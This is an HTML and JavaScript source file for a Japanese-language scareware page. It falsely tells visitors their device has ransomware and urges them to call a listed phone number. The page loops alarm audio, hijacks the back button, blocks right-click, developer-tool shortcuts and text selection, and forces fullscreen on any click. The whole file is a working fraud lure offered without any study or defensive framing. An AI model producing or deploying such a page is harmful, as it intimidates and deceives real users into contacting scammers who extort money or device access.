<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>Warning Page (Separated Files)</title>
  <!-- CSSファイルをリンク -->
  <link rel="stylesheet" href="styles.css" />
</head>
<body oncontextmenu="return false;"> <!-- 右クリック禁止 -->

  <!-- パトランプを表示する要素 -->
  <div class="patrol-lamp"></div>

  <!-- メイン表示部分 -->
  <div class="wrapper">
    <h1 class="warning-text">お使いの端末はランサムウェアに感染しました。</h1>
    <p class="sub-text">
      ただちに <span class="phone-number">070-1371-8527</span> まで連絡してください。
    </p>
  </div>

  <!-- 音声ファイルを2つ同時に挿入 -->
  <!-- autoplay & loop で勝手に再生し続ける -->
  <!-- 例：生ファイルに直接アクセスできるURLを使ってください -->
<audio id="alert-audio1" 
       src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/alert-audio1.mp3"
       autoplay loop preload="auto">
</audio>
<audio id="alert-audio2" 
       src="https://raw.githubusercontent.com/krkm1234/ioexception.java/main/alert-audio2.mp3"
       autoplay loop preload="auto">
</audio>

  <!-- JavaScript（ここではHTML内に記載） -->
  <script>
    // ページ読込完了時、音声を事前ロードする例
    window.addEventListener('load', () => {
      const audioEl1 = document.getElementById('alert-audio1');
      const audioEl2 = document.getElementById('alert-audio2');
      audioEl1.load(); 
      audioEl2.load();
    });

    /*
     * 1. 戻るボタン等の操作をできる限り妨害
     */
    history.pushState(null, null, location.href);
    window.onpopstate = function(event) {
      history.pushState(null, null, location.href);
      alert("戻る操作は許可されていません！");
    };

    /*
     * 2. キーボード操作やドラッグなどの制御
     */
    document.addEventListener('keydown', function(e) {
      // F12 (開発者ツール), Ctrl+Shift+I/J/C など
      if (
        e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C'))
      ) {
        e.preventDefault();
        alert("この操作は許可されていません！");
      }
    });
    // テキスト選択、ドラッグ禁止
    document.addEventListener('selectstart', function(e) {
      e.preventDefault();
    });
    document.addEventListener('dragstart', function(e) {
      e.preventDefault();
    });
    function goFullscreen() {
  const el = document.documentElement;
  if (el.requestFullscreen) {
    el.requestFullscreen();
  } else if (el.webkitRequestFullscreen) {
    el.webkitRequestFullscreen();
  } else if (el.msRequestFullscreen) {
    el.msRequestFullscreen();
  }
}
document.addEventListener('click', goFullscreen);

    /*
     * 3. ブラウザのAutoplayポリシー対策で、クリック時に再生を呼び出す
     */
    const audio1 = document.getElementById('alert-audio1');
    const audio2 = document.getElementById('alert-audio2');

    document.addEventListener('click', () => {
      if (audio1.paused) {
        audio1.play().catch(err => console.log('Audio1再生ブロック:', err));
      }
      if (audio2.paused) {
        audio2.play().catch(err => console.log('Audio2再生ブロック:', err));
      }
    });
  </script>
</body>
</html>
